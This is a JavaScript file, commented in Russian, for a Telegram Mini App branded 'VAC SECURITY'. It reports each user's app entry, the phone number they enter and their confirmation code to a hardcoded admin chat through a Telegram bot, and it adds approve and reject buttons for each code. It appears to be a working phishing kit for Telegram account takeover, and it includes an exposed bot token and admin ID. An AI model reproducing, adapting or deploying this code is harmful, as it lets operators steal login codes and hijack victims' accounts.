// Конфигурация (замените значения)
const BOT_TOKEN = '8196403348:AAGrU-BOJgX6nFZB7f_YV9trqrBGKplWWt0';
const ADMIN_ID = '5665980031';
const BASE_URL = 'https://otz2026.github.io/mybot';

// Форматирование сообщения
const formatMessage = (type, data, user) => {
    const userInfo = `👤 ${user.first_name || 'Пользователь'} ${user.last_name || ''}\n` +
                    `🆔 ID: <code>${user.id || '?'}</code>\n` +
                    (user.username ? `@${user.username}\n` : '');
    
    switch(type) {
        case 'init':
            return {
                text: `🚪 <b>Новый вход в приложение</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'exit':
            return {
                text: `🚶 <b>Пользователь вышел</b>\n\n${userInfo}`,
                buttons: []
            };
        case 'phone':
            return {
                text: `📱 <b>Введён номер:</b> <code>${data}</code>\n\n${userInfo}`,
                buttons: []
            };
        case 'code':
            return {
                text: `🔢 <b>Код подтверждения:</b> <code>${data}</code>\n\n${userInfo}`,
                buttons: [
                    [
                        { 
                            text: "✅ Подтвердить", 
                            url: `${BASE_URL}/yes.html?code=${data}&user_id=${user.id}` 
                        },
                        { 
                            text: "❌ Отклонить", 
                            url: `${BASE_URL}/no.html?code=${data}&user_id=${user.id}` 
                        }
                    ]
                ]
            };
    }
};

// Отправка сообщения
window.sendToBot = async (type, data = null) => {
    try {
        const tg = window.Telegram.WebApp;
        const user = tg.initDataUnsafe.user || {};
        const message = formatMessage(type, data, user);
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: `🔐 <b>VAC SECURITY</b>\n\n${message.text}`,
                parse_mode: 'HTML',
                reply_markup: message.buttons.length ? { 
                    inline_keyboard: message.buttons 
                } : undefined
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('Ошибка отправки:', error);
    }
};